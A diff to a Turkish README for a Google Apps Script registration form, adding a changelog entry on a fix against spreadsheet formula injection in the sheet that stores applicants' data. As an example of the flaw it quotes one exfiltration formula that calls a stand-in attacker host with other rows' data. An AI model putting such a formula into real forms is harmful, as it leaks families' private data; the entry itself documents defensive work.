@@ -13,8 +13,26 @@ Drive'a koyar, bildirim e-postası gönderir ve yönetim paneline liste/belge u�
 
 | Dosya | Durum |
 |---|---|
-| `ulucamii-Kod-v10.gs` | **Canlıda** — 25 Ağustos 2026'da dağıtıldı |
-| `ulucamii-Kod-v9.gs` | Önceki sürüm, karşılaştırma için duruyor |
+| `ulucamii-Kod-v11.gs` | **Canlıda** — 26 Ağustos 2026'da dağıtıldı (Sheets formül koruması) |
+| `ulucamii-Kod-v10.gs` | Önceki sürüm |
+| `ulucamii-Kod-v9.gs` | Karşılaştırma için duruyor |
+
+### v11 — defter hücreleri formüle dönüşemez (26 Ağustos 2026)
+
+Google Sheets `=`, `+`, `-` veya `@` ile başlayan bir metni **formül** sayar. Başvurandan
+gelen bir alan (veli adı, adres, sağlık notu) böylece defterde çalışabiliyordu:
+`=IMPORTXML("http://saldirgan/?"&A2;"//a")` gibi bir girdi, defterdeki **diğer ailelerin
+verisini dışarı sızdırabilirdi**. Panelin CSV çıktısında bu koruma zaten vardı; defterin
+kendisinde yoktu (26 Ağustos güvenlik incelemesi bulgusu).
+
+`hucreGuvenli()` riskli başlangıçlara zararsız bir tek tırnak öneki koyar (Sheets arayüzünde
+görünmez, okunan değere dâhil değildir). `satirEkle()` defterle konuşan tek yerdir: her satır
+yazılmadan önce hücre hücre geçer. Tarih nesneleri dokunulmadan geçer — zaman damgası bozulmaz.
+
+**Yan fayda:** `+32…` telefon numaraları artık sayıya çevrilmiyor, artı işareti korunuyor.
+
+Uçtan uca doğrulandı: `=1+1`, `=IMPORTXML(…)` ve `+42` içeren bir test kaydı gönderildi,
+defterde **metin olarak** kaldıkları görüldü, ardından kayıt ve PDF'i silindi.
 
 > **Anahtarlar bu dosyalarda YOKTUR.** Depo public olduğu için panel API anahtarı koddan
 > çıkarıldı; yerinde `SCRIPT-PROPERTIES-ICINDE` yer tutucusu durur. Gerçek değer Apps
